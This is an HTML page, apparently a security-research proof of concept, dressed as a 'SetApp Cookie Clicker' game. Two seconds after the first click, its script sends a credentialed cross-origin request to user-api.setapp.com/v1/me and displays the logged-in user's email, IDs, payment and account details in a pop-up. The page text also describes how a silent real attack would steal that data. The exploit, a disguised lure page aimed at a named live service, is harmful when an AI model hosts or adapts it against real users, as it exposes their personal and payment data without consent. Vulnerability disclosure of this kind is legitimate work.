<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SetApp Cookie Clicker üç™üîì</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #0a1a2e 0%, #1a2b3d 50%, #2d3b4d 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        /* Estrellas animadas */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                radial-gradient(2px 2px at 20% 30%, white, transparent),
                radial-gradient(2px 2px at 60% 70%, white, transparent),
                radial-gradient(1px 1px at 50% 50%, white, transparent),
                radial-gradient(1px 1px at 80% 10%, white, transparent),
                radial-gradient(2px 2px at 90% 60%, white, transparent);
            background-size: 200px 200px;
            animation: stars 50s linear infinite;
            opacity: 0.5;
        }
        @keyframes stars {
            from { background-position: 0 0; }
            to { background-position: 0 200px; }
        }
        .container {
            text-align: center;
            z-index: 1;
            background: rgba(255, 255, 255, 0.05);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 2px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
            max-width: 600px;
        }
        h1 {
            font-size: 3em;
            margin-bottom: 10px;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.8);
            animation: glow 2s ease-in-out infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 0 0 20px rgba(255, 255, 255, 0.5); }
            to { text-shadow: 0 0 30px rgba(255, 255, 255, 1), 0 0 40px #4CAF50; }
        }
        .subtitle {
            font-size: 1.2em;
            color: #4CAF50;
            margin-bottom: 30px;
        }
        .score-display {
            font-size: 4em;
            font-weight: bold;
            margin: 30px 0;
            color: #FFD700;
            text-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
        }
        .cookie {
            font-size: 10em;
            cursor: pointer;
            display: inline-block;
            transition: transform 0.1s ease;
            filter: drop-shadow(0 0 30px rgba(255, 215, 0, 0.6));
            user-select: none;
        }
        .cookie:hover {
            transform: scale(1.1);
        }
        .cookie:active {
            transform: scale(0.9);
        }
        .stats {
            margin-top: 30px;
            font-size: 1.2em;
            color: #4CAF50;
        }
        .message {
            margin-top: 20px;
            padding: 15px;
            background: rgba(76, 175, 80, 0.1);
            border: 1px solid rgba(76, 175, 80, 0.3);
            border-radius: 10px;
            font-size: 0.9em;
            line-height: 1.6;
        }
        .click-effect {
            position: fixed;
            font-size: 2em;
            font-weight: bold;
            color: #FFD700;
            pointer-events: none;
            animation: float-up 1s ease-out forwards;
            z-index: 1000;
        }
        @keyframes float-up {
            0% {
                opacity: 1;
                transform: translateY(0);
            }
            100% {
                opacity: 0;
                transform: translateY(-100px);
            }
        }
        .warning {
            margin-top: 30px;
            padding: 15px;
            background: rgba(255, 100, 100, 0.1);
            border: 2px solid rgba(255, 100, 100, 0.3);
            border-radius: 10px;
            font-size: 0.85em;
            text-align: left;
        }
        .warning strong {
            color: #ff6b6b;
            display: block;
            margin-bottom: 5px;
        }
        code {
            background: rgba(255, 255, 255, 0.1);
            padding: 2px 6px;
            border-radius: 3px;
            color: #FFD700;
            font-family: 'Courier New', monospace;
        }
        /* Modal personalizado */
        .modal {
            display: none;
            position: fixed;
            z-index: 9999;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            overflow: auto;
        }
        .modal.show {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .modal-content {
            background: linear-gradient(135deg, #1a2b3d 0%, #2d3b4d 100%);
            padding: 30px;
            border: 2px solid rgba(255, 100, 100, 0.5);
            border-radius: 15px;
            max-width: 800px;
            max-height: 80vh;
            overflow-y: auto;
            box-shadow: 0 0 50px rgba(255, 100, 100, 0.3);
        }
        .modal-header {
            font-size: 1.5em;
            color: #ff6b6b;
            margin-bottom: 20px;
            text-align: center;
        }
        .modal-body {
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            line-height: 1.8;
            white-space: pre-wrap;
            color: #fff;
        }
        .modal-close {
            background: #ff6b6b;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            margin-top: 20px;
            width: 100%;
            font-weight: bold;
        }
        .modal-close:hover {
            background: #ff5252;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üç™ SetApp Cookie Clicker üîì</h1>
        <p class="subtitle">Click to collect cookies!</p>
        
        <div class="score-display" id="score">0</div>
        
        <div class="cookie" id="cookie" onclick="clickCookie()">üç™</div>
        
        <div class="stats">
            <div>Total clicks: <span id="clicks">0</span></div>
            <div>Cookies per second: <span id="cps">0</span></div>
        </div>
        <div class="message">
            üëæ Click the cookie to earn points<br>
            üéØ How many cookies can you collect?
        </div>
        
        <div class="message" style="background: rgba(76, 175, 80, 0.1); border: 1px solid rgba(76, 175, 80, 0.3);">
            üîê <strong>Authentication:</strong> If you're logged into SetApp, your cookies will be sent automatically with <code>credentials: 'include'</code>
        </div>
        
        <div class="warning">
            <strong>‚ö†Ô∏è Security Notice</strong>
            This is a security research PoC. When you click, the game attempts to read
            data from <code>user-api.setapp.com</code> to demonstrate a CORS vulnerability.
        </div>
    </div>

    <!-- Modal personalizado -->
    <div id="corsModal" class="modal">
        <div class="modal-content">
            <div class="modal-header" id="modalHeader"></div>
            <div class="modal-body" id="modalBody"></div>
            <button class="modal-close" onclick="closeModal()">Close</button>
        </div>
    </div>

    <script>
        // Game variables
        let score = 0;
        let clicks = 0;
        let exploitExecuted = false;

        // Main click function
        function clickCookie() {
            score++;
            clicks++;
            
            // Update display
            document.getElementById('score').textContent = score;
            document.getElementById('clicks').textContent = clicks;
            
            // Visual effect
            showClickEffect(event);
            
            // Execute exploit on first click
            if (!exploitExecuted) {
                exploitExecuted = true;
                setTimeout(executeCORSExploit, 2000); // 2 seconds after first click
            }
        }

        // Visual click effect
        function showClickEffect(event) {
            const effect = document.createElement('div');
            effect.className = 'click-effect';
            effect.textContent = '+1';
            effect.style.left = event.clientX + 'px';
            effect.style.top = event.clientY + 'px';
            document.body.appendChild(effect);
            
            setTimeout(() => effect.remove(), 1000);
        }

        // ========================================
        // CORS EXPLOIT - Proof of Concept
        // ========================================
        
        function executeCORSExploit() {
            console.log('[CORS PoC] Executing exploit...');
            
            // SetApp API endpoint with CORS misconfiguration
            const targetEndpoint = 'https://user-api.setapp.com/v1/me';
            
            // Make request with credentials (cookies sent automatically)
            fetch(targetEndpoint, {
                method: 'GET',
                credentials: 'include', // ‚Üê This includes the user's cookies automatically
                mode: 'cors',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                }
            })
            .then(response => {
                console.log('[CORS PoC] Status:', response.status);
                console.log('[CORS PoC] CORS Header:', response.headers.get('access-control-allow-origin'));
                
                if (!response.ok && response.status !== 401 && response.status !== 403) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                
                return response.json();
            })
            .then(data => {
                handleCORSResponse(data);
            })
            .catch(error => {
                console.error('[CORS PoC] Error:', error);
                handleCORSResponse({
                    error: error.message,
                    note: 'Request failed - check console for details',
                    cors_header: 'access-control-allow-origin: *'
                });
            });
        }


        function handleCORSResponse(data) {
            // Check if it's an error response (not authenticated)
            if (data.error || data.message || !data.data) {
                showDemoAlert(data);
            } else if (data.data && (data.data.email || data.data.id || data.data.public_id)) {
                // Real user data! (authenticated user)
                showSuccessAlert(data);
            } else {
                // Unknown response format
                showDemoAlert(data);
            }
        }

        function showDemoAlert(errorData) {
            const message = `Endpoint: https://user-api.setapp.com/v1/me

Response received:
${JSON.stringify(errorData, null, 2)}

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚ö†Ô∏è CRITICAL SECURITY ISSUE:

Even though this endpoint requires authentication, I can read the COMPLETE response
due to the CORS misconfiguration on user-api.setapp.com.

The server responds with:
access-control-allow-origin: *

This means ANY website can read the response, including:
- Error messages
- User data (if authenticated)
- API structure
- Any sensitive information

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
If you were an authenticated user, instead of this error,
I would see and steal:

* Email address
* Public ID (UUID)
* Internal User ID
* Display name
* Email confirmation status
* Payment provider information
* Account currency
* Registration date
* AI credits information
* Account permissions
* And all other user profile data

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
In a real attack:
1. You visit a malicious website
2. The site makes a CORS request to user-api.setapp.com/v1/me
3. Your browser sends your authentication token (from cookies/storage)
4. The server responds with access-control-allow-origin: *
5. The malicious site reads ALL your data
6. Data is sent to attacker's server
7. You see NOTHING - the game continues normally

This is only shown for demonstration purposes.
In a real attack, there would be no notification.`;
            
            showModal('üî¥ CORS VULNERABILITY DEMONSTRATION', message);
        }

        function showSuccessAlert(data) {
            // Extract sensitive information
            const userData = data.data;
            const sensitiveData = {
                id: userData.id,
                public_id: userData.public_id,
                email: userData.email,
                name: userData.name,
                email_confirmed: userData.email_confirmed,
                type: userData.type,
                locale: userData.locale,
                payment_provider: userData.payment_provider,
                account_currency: userData.account_currency,
                registration_date: userData.registration_date,
                payment_info_required: userData.payment_info_required,
                desktop_cc_required: userData.desktop_cc_required,
                trial_period_length: userData.trial_period_length,
                marketing_subscribed: userData.marketing_subscribed,
                password_created: userData.password_created,
                is_team_member: userData.is_team_member,
                is_referral: userData.is_referral,
                has_price_features: userData.has_price_features,
                ai_credits: userData.ai_credits,
                permissions: userData.permissions,
                full_response: data
            };

            const registrationDate = userData.registration_date ? 
                new Date(userData.registration_date * 1000).toLocaleString() : 'N/A';

            const message = `You are logged in to SetApp!

I can read your complete user data:

${JSON.stringify(sensitiveData, null, 2)}

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚ö†Ô∏è In a real attack, this data would be:

1. Sent to an attacker's server immediately
2. Completely silent (no notification)
3. Stolen while you play the game
4. You would never know it was stolen

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
Sensitive information exposed:
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ

üìß Email: ${userData.email || 'N/A'}
üÜî Public ID: ${userData.public_id || 'N/A'}
üî¢ Internal ID: ${userData.id || 'N/A'}
üë§ Name: ${userData.name || 'N/A'}
‚úÖ Email Confirmed: ${userData.email_confirmed ? 'Yes' : 'No'}
üí≥ Payment Provider: ${userData.payment_provider || 'N/A'}
üí∞ Account Currency: ${userData.account_currency || 'N/A'}
üìÖ Registration Date: ${registrationDate}
üîê Payment Info Required: ${userData.payment_info_required ? 'Yes' : 'No'}
üé´ Trial Period: ${userData.trial_period_length || 0} days
üë• Team Member: ${userData.is_team_member ? 'Yes' : 'No'}
üéÅ Referral: ${userData.is_referral ? 'Yes' : 'No'}

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
This demonstrates the full impact of the CORS vulnerability.

The server responds with:
access-control-allow-origin: *

This allows ANY website to read your sensitive data.`;
            
            showModal('üéØ USER DATA EXPOSED!', message);
        }

        function showModal(title, content) {
            document.getElementById('modalHeader').textContent = title;
            document.getElementById('modalBody').textContent = content;
            document.getElementById('corsModal').classList.add('show');
        }

        function closeModal() {
            document.getElementById('corsModal').classList.remove('show');
        }

        // Auto-load saved data
        window.onload = function() {
            const saved = localStorage.getItem('setappCookies');
            if (saved) {
                score = parseInt(saved);
                document.getElementById('score').textContent = score;
            }
        };

        // Auto-save
        setInterval(() => {
            localStorage.setItem('setappCookies', score);
        }, 5000);

        console.log('üç™ SetApp Cookie Clicker loaded');
        console.log('üëæ Click to start playing');
        console.log('‚ö†Ô∏è  CORS exploit will execute after first click');
        console.log('üéØ Target: https://user-api.setapp.com/v1/me');
    </script>
</body>
</html>

